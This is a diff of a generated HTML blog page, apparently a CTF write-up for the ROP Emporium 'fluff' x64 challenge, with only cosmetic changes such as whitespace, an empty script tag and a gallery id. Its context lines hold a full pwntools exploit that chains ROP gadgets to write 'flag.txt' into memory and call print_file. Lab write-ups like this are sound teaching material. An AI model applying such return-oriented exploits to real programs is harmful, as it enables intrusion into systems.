@@ -64,6 +64,11 @@
 
 <meta name="generator" content="Hexo 7.1.1"></head>
 
+<script>
+
+
+
+</script>
 <body>
   
   
@@ -274,8 +279,10 @@
   </div>
 
     
-  </div>
+  </div> 
 </sidebar>
+
+
     </div>
     <div id="content-body">
        
@@ -287,7 +294,7 @@
 <div class="article-gallery">
   <div class="article-gallery-photos">
     
-      <a class="article-gallery-img" rel="gallery_cm95uvrbb00003gky65es4qfe">
+      <a class="article-gallery-img" rel="gallery_cmatosr1i000acskybuzf107q">
         <img src="/wpimages/2024/ctf/pwn/roprmporium_x64.jpg" itemprop="image">
       </a>
     
@@ -362,7 +369,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;fluff&#x27;</span>) </span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line">p=gdb.debug(<span class="string">&#x27;./fluff&#x27;</span>,<span class="string">&quot;b pwnme&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">b&#x27;flag.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x00601038</span></span><br><span class="line"></span><br><span class="line">pop_rdx_rcx_add_bextr=<span class="number">0x040062a</span></span><br><span class="line"></span><br><span class="line">xlat_al_rbx=<span class="number">0x0400628</span></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x04006a3</span></span><br><span class="line"></span><br><span class="line">stosb_rdi_al=<span class="number">0x0400639</span></span><br><span class="line"></span><br><span class="line">print_file=<span class="number">0x00400510</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">mask=p64(<span class="number">0x2300</span>)</span><br><span class="line"></span><br><span class="line">tmemaddress=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">	tmemaddress.append(<span class="built_in">hex</span>(read(<span class="string">&#x27;./fluff&#x27;</span>).find(flag[i])+elf.address))</span><br><span class="line"><span class="built_in">print</span>(tmemaddress)</span><br><span class="line"></span><br><span class="line">al=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">	payload+=p64(pop_rdx_rcx_add_bextr)+mask</span><br><span class="line">	<span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">		al=<span class="number">0xb</span></span><br><span class="line">	<span class="keyword">elif</span> i&gt;<span class="number">0</span>:</span><br><span class="line">		al=flag[i-<span class="number">1</span>]</span><br><span class="line">	payload+=p64(<span class="built_in">int</span>(tmemaddress[i],<span class="number">16</span>) - al - <span class="number">0x3ef2</span>)</span><br><span class="line">	payload+=p64(xlat_al_rbx)</span><br><span class="line">	payload+=p64(pop_rdi) + p64(bss+i)</span><br><span class="line">	payload+=p64(stosb_rdi_al)</span><br><span class="line">payload+=p64(pop_rdi)+p64(bss)+p64(print_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
         
       </div>
-
+      
          
     </div>
     
@@ -417,6 +424,7 @@
   </div>
 </footer>
 
+
     </div>
     <div class="back-to-top-wrapper">
     <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
@@ -445,3 +453,5 @@
   <script src="/js/light-dark-switch.js"></script>
 </body>
 </html>
+
+
